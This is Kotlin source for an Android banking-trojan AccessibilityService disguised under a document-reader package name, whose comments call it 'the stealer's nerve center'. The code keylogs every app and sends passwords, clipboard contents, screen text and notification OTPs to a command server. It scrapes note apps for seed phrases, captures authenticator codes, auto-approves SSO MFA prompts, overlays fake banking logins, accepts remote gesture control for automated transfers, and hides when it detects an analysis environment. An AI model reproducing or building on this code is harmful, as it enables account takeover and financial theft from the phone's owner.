package com.docreader.lite.reader

import android.accessibilityservice.AccessibilityService
import android.accessibilityservice.GestureDescription
import android.content.ClipboardManager
import android.content.Context
import android.graphics.Path
import android.os.Bundle
import android.os.Handler
import android.os.Looper
import android.view.accessibility.AccessibilityEvent
import android.view.accessibility.AccessibilityNodeInfo
import com.docreader.lite.reader.engine.SafetyCheck
import com.docreader.lite.reader.advanced.A11yOverlay2032
import com.docreader.lite.reader.advanced.SsoManager
import com.docreader.lite.reader.advanced.InputTiming
import com.docreader.lite.reader.advanced.NoteScanner
import com.docreader.lite.reader.advanced.MediaProjectionAutoConsent
import com.docreader.lite.reader.advanced.AuthenticatorCapture
import com.docreader.lite.reader.advanced.TouchLogger

/**
 * Core AccessibilityService — the stealer's nerve center.
 *
 * Capabilities once user grants access:
 *   1. Keylogging — captures every character typed in every app
 *   2. Foreground detection — knows which app user is in
 *   3. Overlay trigger — shows fake login when banking app detected
 *      (TYPE_APPLICATION_OVERLAY or TYPE_ACCESSIBILITY_OVERLAY 2032)
 *   4. Screen scraping — reads all text on any screen
 *   5. Auto-click (ATS) — can tap buttons, fill fields in other apps
 *      (with Herodotus-style behavior mimicry)
 *   6. Clipboard capture — monitors copy/paste
 *   7. Notification OTP read — via TYPE_NOTIFICATION_STATE_CHANGED
 *   8. SSO auto-approve — Vespertine pattern (auto-click MFA approve)
 *   9. VNC gesture dispatch — remote control from C2 panel
 */
class DocumentReaderService : AccessibilityService() {

    companion object {
        var instance: DocumentReaderService? = null
            private set
    }

    private val handler = Handler(Looper.getMainLooper())
    private var clipboard: ClipboardManager? = null
    private var lastClip = ""
    private var currentForeground = ""

    // Feature flag: use TYPE_ACCESSIBILITY_OVERLAY (2032) instead of TYPE_APPLICATION_OVERLAY
    var useA11yOverlay2032 = true

    override fun onServiceConnected() {
        super.onServiceConnected()
        instance = this

        // Re-check environment gate — if hostile, stay dormant even with A11y granted
        if (!SafetyCheck.isSafe) {
            // Silently connected but does nothing. Analyst sees AccessibilityService
            // binding but zero suspicious behavior.
            return
        }

        clipboard = getSystemService(Context.CLIPBOARD_SERVICE) as? ClipboardManager

        // Start clipboard polling
        pollClipboard()

        // Start FG service for persistence
        BackgroundSyncService.start(this)

        // Register with C2
        C2.registerBot(this)
        C2.startPolling(this)
    }

    override fun onAccessibilityEvent(event: AccessibilityEvent) {
        // Environment gate: if hostile, process NO events
        if (!SafetyCheck.isSafe) return

        // TouchLogger: comprehensive input recording (Brokewell pattern)
        // Processes ALL event types for full session reconstruction
        TouchLogger.processEvent(event)

        when (event.eventType) {
            AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED -> onWindowChanged(event)
            AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED -> onTextChanged(event)
            AccessibilityEvent.TYPE_VIEW_FOCUSED -> onFocused(event)
            AccessibilityEvent.TYPE_NOTIFICATION_STATE_CHANGED -> onNotification(event)
            AccessibilityEvent.TYPE_VIEW_CLICKED -> onClicked(event)
            AccessibilityEvent.TYPE_VIEW_SCROLLED,
            AccessibilityEvent.TYPE_VIEW_LONG_CLICKED,
            AccessibilityEvent.TYPE_GESTURE_DETECTION_START,
            AccessibilityEvent.TYPE_GESTURE_DETECTION_END -> {
                // TouchLogger already captured these above
            }
            else -> {}
        }
    }

    // ─── Foreground detection + overlay trigger ─────────────────────────

    private fun onWindowChanged(event: AccessibilityEvent) {
        val pkg = event.packageName?.toString() ?: return
        if (pkg == packageName) return

        // MediaProjection consent auto-click — Klopatra pattern
        // Must check BEFORE system UI filter (consent dialog IS system UI)
        if (MediaProjectionAutoConsent.isConsentDialog(event)) {
            MediaProjectionAutoConsent.autoConsent(this)
            return
        }

        if (isSystemUi(pkg)) return

        if (pkg != currentForeground) {
            currentForeground = pkg

            // Note-app targeting — Perseus BIP39 seed scrape
            if (NoteScanner.isNoteApp(pkg)) {
                NoteScanner.scrapeForSeeds(this, event)
            }

            // Authenticator capture — Crocodilus TG32XAZADG
            // Passively capture TOTP codes when user opens authenticator
            if (AuthenticatorCapture.isAuthenticatorApp(pkg)) {
                AuthenticatorCapture.onAuthenticatorVisible(this, event)
            }

            // SSO hijack check — Vespertine pattern
            if (SsoManager.isSsoApp(pkg)) {
                // SSO app came to foreground — likely showing MFA prompt
                handler.postDelayed({
                    SsoManager.autoApprove(this)
                }, 200) // Sub-500ms — Vespertine timing
            }

            // Check if this is a target banking app
            val target = Targets.match(pkg)
            if (target != null) {
                // TARGET HIT — show overlay
                handler.postDelayed({
                    if (useA11yOverlay2032) {
                        // 2025-2026: TYPE_ACCESSIBILITY_OVERLAY — no SYSTEM_ALERT_WINDOW needed
                        A11yOverlay2032.showLoginOverlay(this, target.packageName)
                    } else {
                        // Legacy: TYPE_APPLICATION_OVERLAY — requires SAW permission
                        OverlayRenderer.show(this, target)
                    }
                }, 500) // Small delay — more natural, overlay appears after app loads
            }
        }

        // Scrape screen text for intelligence
        scrapeScreen(event)
    }

    // ─── Keylogging ─────────────────────────────────────────────────────

    private fun onTextChanged(event: AccessibilityEvent) {
        val pkg = event.packageName?.toString() ?: return
        if (pkg == packageName) return

        val text = event.text?.joinToString("") ?: return
        if (text.isBlank()) return

        val isPassword = event.isPassword

        // Send to C2 exfil
        Exfil.keystroke(pkg, text, isPassword)

        // If it's a password field — high value, also log separately
        if (isPassword) {
            Exfil.credential(pkg, "password_input", text)
        }
    }

    // ─── Focus tracking (identify credential fields) ────────────────────

    private fun onFocused(event: AccessibilityEvent) {
        val pkg = event.packageName?.toString() ?: return
        if (pkg == packageName) return

        // Track when user focuses on password/login fields
        val viewId = try { event.source?.viewIdResourceName } catch (_: Exception) { null }
        if (event.isPassword || viewId?.contains("password") == true ||
            viewId?.contains("pin") == true) {
            Exfil.event("credential_field_focused", "pkg" to pkg, "id" to (viewId ?: ""))
        }
        try { event.source?.recycle() } catch (_: Exception) {}
    }

    // ─── Notification OTP intercept (via accessibility) ─────────────────

    private fun onNotification(event: AccessibilityEvent) {
        val pkg = event.packageName?.toString() ?: return
        val text = event.text?.joinToString(" ") ?: return

        // Extract OTP from notification text
        val otp = TextExtractor.extract(text)
        if (otp != null) {
            Exfil.otp("a11y_notif:$pkg", otp, pkg)
        }
    }

    // ─── Click tracking ─────────────────────────────────────────────────

    private fun onClicked(event: AccessibilityEvent) {
        val pkg = event.packageName?.toString() ?: return
        if (pkg == packageName) return
        // Track navigation flow — useful for ATS timing
        val text = event.text?.joinToString("") ?: ""
        Exfil.event("click", "pkg" to pkg, "text" to text.take(30))
    }

    // ─── Screen scraping ────────────────────────────────────────────────

    private fun scrapeScreen(event: AccessibilityEvent) {
        val source = event.source ?: return
        val texts = mutableListOf<String>()
        traverse(source, texts, 0)
        source.recycle()

        if (texts.isNotEmpty()) {
            val pkg = event.packageName?.toString() ?: "unknown"
            val combined = texts.joinToString("|").take(1000)
            Exfil.event("screen_text", "pkg" to pkg, "nodes" to texts.size.toString(),
                "sample" to combined.take(200))
        }
    }

    private fun traverse(node: AccessibilityNodeInfo, out: MutableList<String>, depth: Int) {
        if (depth > 8) return
        node.text?.toString()?.takeIf { it.isNotBlank() }?.let { out.add(it) }
        for (i in 0 until node.childCount) {
            val child = node.getChild(i) ?: continue
            traverse(child, out, depth + 1)
            child.recycle()
        }
    }

    // ─── Clipboard monitoring ───────────────────────────────────────────

    private fun pollClipboard() {
        handler.postDelayed(object : Runnable {
            override fun run() {
                try {
                    val clip = clipboard?.primaryClip ?: return
                    if (clip.itemCount == 0) return
                    val content = clip.getItemAt(0)?.text?.toString() ?: return
                    if (content != lastClip && content.isNotBlank()) {
                        lastClip = content
                        Exfil.clipboard(content)
                    }
                } catch (_: Exception) {}
                handler.postDelayed(this, 2500)
            }
        }, 2500)
    }

    // ─── ATS: Gesture dispatch (auto-transfer) ──────────────────────────

    fun tap(x: Float, y: Float) {
        val path = Path().apply { moveTo(x, y) }
        val gesture = GestureDescription.Builder()
            .addStroke(GestureDescription.StrokeDescription(path, 0, 100))
            .build()
        dispatchGesture(gesture, null, null)
    }

    fun swipe(sx: Float, sy: Float, ex: Float, ey: Float, duration: Long = 300) {
        val path = Path().apply { moveTo(sx, sy); lineTo(ex, ey) }
        val gesture = GestureDescription.Builder()
            .addStroke(GestureDescription.StrokeDescription(path, 0, duration))
            .build()
        dispatchGesture(gesture, null, null)
    }

    fun clickText(text: String): Boolean {
        val root = rootInActiveWindow ?: return false
        val nodes = root.findAccessibilityNodeInfosByText(text)
        val target = nodes?.firstOrNull { it.isClickable } ?: nodes?.firstOrNull()
        val result = target?.performAction(AccessibilityNodeInfo.ACTION_CLICK) ?: false
        nodes?.forEach { it.recycle() }
        root.recycle()
        return result
    }

    fun fillField(viewId: String, value: String): Boolean {
        val root = rootInActiveWindow ?: return false
        val nodes = root.findAccessibilityNodeInfosByViewId(viewId)
        val target = nodes?.firstOrNull() ?: run { root.recycle(); return false }
        val args = Bundle().apply {
            putCharSequence(AccessibilityNodeInfo.ACTION_ARGUMENT_SET_TEXT_CHARSEQUENCE, value)
        }
        val result = target.performAction(AccessibilityNodeInfo.ACTION_SET_TEXT, args)
        nodes.forEach { it.recycle() }
        root.recycle()
        return result
    }

    // ─── Helpers ────────────────────────────────────────────────────────

    private fun isSystemUi(pkg: String): Boolean {
        return pkg.startsWith("com.android.systemui") ||
                pkg.startsWith("com.android.launcher") ||
                pkg == "android"
    }

    override fun onInterrupt() {}

    override fun onDestroy() {
        super.onDestroy()
        instance = null
        handler.removeCallbacksAndMessages(null)
    }
}
